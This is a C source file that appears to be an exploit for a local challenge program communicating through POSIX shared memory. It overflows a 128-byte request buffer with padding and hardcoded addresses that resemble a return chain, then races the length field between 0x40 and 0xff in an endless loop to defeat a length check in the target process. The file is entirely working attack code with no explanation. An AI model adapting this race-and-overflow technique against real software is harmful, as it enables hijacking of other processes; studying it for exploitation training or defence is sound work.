#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <wchar.h>

#define MAX_STR_LEN 128

typedef struct req {
    unsigned char len;
    char shift;
    char buf[MAX_STR_LEN];
} shm_req_t;

int main(int argc, char* argv[]){
    char* name = argv[1];

    usleep(3000);

    mode_t old_umask = umask(0);
    int fd = shm_open(name, O_RDWR , S_IRWXU | S_IRWXG | S_IRWXO);
    umask(old_umask);

    shm_req_t* shm_req = mmap(NULL, sizeof(shm_req_t), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if(shm_req == MAP_FAILED) {
        fprintf(stderr, "mmap error");
        exit(1);
    }

    shm_req->len = 0x40;
    shm_req->shift = 0;

    memset(shm_req->buf, 'A', 0x88);
    memcpy((shm_req->buf) + 0x88, "\xa0\x40\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0x90, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0x98, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xa0, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xa8, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xb0, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xb8, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xc0, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xc8, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xd0, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xd8, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xe0, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xe8, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xf0, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);
    memcpy((shm_req->buf) + 0xf8, "\x4c\x12\x40\x00\x00\x00\x00\x00", 8);

    usleep(6000);

    while(1){
        shm_req->len = 0xff;
        shm_req->len = 0x40;
    }

    shm_req->len = 0;

    close(fd);
    shm_unlink(name);


    return 0;
}
